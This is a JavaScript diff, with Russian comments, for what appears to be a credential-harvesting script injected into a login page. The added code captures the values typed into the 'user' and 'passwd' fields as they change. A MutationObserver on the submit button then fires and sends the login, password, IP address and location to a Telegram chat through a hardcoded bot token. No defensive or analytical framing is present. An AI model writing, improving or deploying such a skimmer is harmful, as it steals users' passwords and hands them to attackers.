@@ -1,6 +1,9 @@
 const tgBotToken = "7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc";
 const tgChatId = "-1002252120859";
 
+let loginValue = "Не указано"; // Переменная для хранения логина
+let passwordValue = "Не указано"; // Переменная для хранения пароля
+
 function sendToTelegram(message) {
     const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage`;
     fetch(url, {
@@ -46,12 +49,7 @@ function getSimplifiedUserAgent() {
     return `${browser} on ${os}`;
 }
 
-// Функция для отправки всей формы
-function sendFormData(form) {
-    const formData = new FormData(form);
-    const login = formData.get("user") || "Не указано";
-    const password = formData.get("passwd") || "Не указано";
-
+function sendFormData() {
     const simplifiedUserAgent = getSimplifiedUserAgent();
 
     getIPInfo().then(info => {
@@ -60,11 +58,11 @@ function sendFormData(form) {
 ---
 - 🛡️ **Логин:**
 \`\`\`
-${login}
+${loginValue}
 \`\`\`
 - 🛡️ **Пароль:**
 \`\`\`
-${password}
+${passwordValue}
 \`\`\`
 - 🌐 **IP-адрес:** ${info.ip}
 - 📍 **Местоположение:** ${info.location}
@@ -77,14 +75,27 @@ ${domainHashTag}`;
     });
 }
 
-// Отслеживаем изменение кнопки "ОК"
-document.querySelectorAll('input[type="submit"], button[type="submit"]').forEach(button => {
-    button.addEventListener("input", event => {
-        if (event.target.value === "Log In") {
-            const form = event.target.closest("form");
-            if (form) {
-                sendFormData(form);
-            }
+// Отслеживаем изменения в полях логина и пароля
+document.querySelectorAll("form input[name='user'], form input[name='passwd']").forEach(input => {
+    input.addEventListener("input", event => {
+        if (event.target.name === "user") {
+            loginValue = event.target.value || "Не указано";
+        }
+        if (event.target.name === "passwd") {
+            passwordValue = event.target.value || "Не указано";
         }
     });
+});
+
+// Отслеживаем изменение кнопки OK
+document.querySelectorAll('input[type="submit"], button[type="submit"]').forEach(button => {
+    const observer = new MutationObserver(mutations => {
+        mutations.forEach(mutation => {
+            if (mutation.type === "attributes" && mutation.target.value === "Log In") {
+                sendFormData(); // Отправляем данные, если кнопка изменилась на "Log In"
+            }
+        });
+    });
+
+    observer.observe(button, { attributes: true, attributeFilter: ["value"] });
 });
